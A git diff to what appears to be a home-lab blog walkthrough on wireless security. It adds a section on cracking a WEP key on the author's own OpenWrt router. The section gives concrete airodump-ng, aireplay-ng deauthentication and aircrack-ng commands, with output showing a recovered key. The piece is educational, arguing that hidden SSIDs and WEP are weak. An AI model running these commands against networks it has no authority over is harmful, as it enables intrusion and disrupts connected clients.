@@ -13,7 +13,7 @@ category: pages
 
 There are tools (Kismet, in particular) which will show you available networks, unmask SSIDs and show you connected clients. But where's the fun in that?
 
-FYI you might need to get the vmware tools installed if you want things like clipboard integration. Do an `apt-get update` followed by `apt-get install open-wm-toolbox` and run `vmware-user-suid-wrapper`.
+FYI you might need to get the vmware tools installed if you want things like clipboard integration. Do an `apt-get update` followed by `apt-get install open-vm-toolbox` and run `vmware-user-suid-wrapper`.
 
 Boot up KALI. Open a terminal and make sure your wireless adapter has been recognised:
 
@@ -201,3 +201,46 @@ Clearly if the AP had no client connected to it, it wouldn't be particularly eff
 ### Level 0x2 ###
 
 Let's up the ante a bit by enabling WEP on the router. And we'll leave the SSID hidden too.
+
+In order to obtain the WEP key, we need to capture a lot of traffic - specifically, we're looking for IVs (Initialisation Vectors). We won't crafting our own tools for this, but use the `air`-suite instead. Let's start by creating a monitor interface: `airmon-ng start wlan0`.
+
+We can then start listening for traffic with `airodump-ng --bssid 10:fe:ed:61:fa:e8 --channel 11 mon0`:
+
+     CH 11 ][ Elapsed: 7 mins ][ 2014-09-26 22:53                                         
+                                                                                                      
+     BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                      
+     10:FE:ED:61:FA:E8  -63 100     3617    33100    0  11  54e. WEP  WEP         OpenWrt             
+                                                                                                      
+     BSSID              STATION            PWR   Rate    Lost    Frames  Probe                        
+                                                                                                      
+     10:FE:ED:61:FA:E8  00:26:37:97:9A:7E  -56   11e-11      0    46737                              
+
+Technically we could listen on passively and collect packets as they go - but if it's a quiet network, it'll take ages for us to get enough packets to start cracking the key. As described on the [aircrack wiki](http://www.aircrack-ng.org/doku.php?id=simple_wep_crack), normal traffic does not generate IV packets quickly. What does however, is client authentication. As this is our own network and we're not trying to be subtle, we can force clients to de-authenticate (cf above when we used `aireplay-ng -0 1 -a 10:fe:ed:61:fa:e8 mon0` to blindly broadcast deauth packets to every client).
+
+The question is though, how many IVs are sufficient. It seems to really depend - sometimes you might get lucky and only need a hanful - others you might need to just wait it out. I set up the router to use a 40bit key because it was taking too long with 104bit one (heh).
+
+Once you feel you have collected enough, `ctrl-c` airodump-ng (note you can re-run it, and it will just keep incrementing the packet dumps). Side note - in the interest of saving space, you can ask airodump-ng to only capture IVs with the `-ivs` flag. We can now try to crack the key using `aircrack-ng OpenWrt.dump-0*.ivs`.
+
+I was fairly lucky, and the tool managed to recover the key with only 768 IVs:
+
+                                          Aircrack-ng 1.2 beta1
+    
+    
+                              [00:00:03] Tested 529255 keys (got 768 IVs)
+    
+       KB    depth   byte(vote)
+        0   86/ 87   F6(1024) 08( 768) 0A( 768) 15( 768) 1A( 768) 1B( 768) 1C( 768) 
+        1    5/  8   AA(1792) 05(1536) 17(1536) 26(1536) 4F(1536) 64(1536) 65(1536) 
+        2    8/  9   E0(1792) 33(1536) 37(1536) 48(1536) 7E(1536) 98(1536) BA(1536) 
+        3   30/  3   F5(1536) 15(1280) 1B(1280) 1C(1280) 50(1280) 57(1280) 5A(1280) 
+        4    8/  4   FA(1792) 13(1536) 22(1536) 45(1536) 53(1536) 62(1536) AE(1536) 
+    
+                         KEY FOUND! [ 69:72:69:73:68 ] (ASCII: irish )
+      Decrypted correctly: 100%
+
+And voila - key found!
+
+### Wrapping up ###
+
+We've briefly shown that security through obscurity doesn't work - hidden SSIDs don't stay hidden for long. Likewise, MAC address filtering can be bypassed easily. And finally, Wired Equivalent Privacy (WEP) doesn't offer much privacy at all. Not to say it's useless, but just like medieval fortifications, security is best done through layers. And for the rest of us, there's always WPA2!
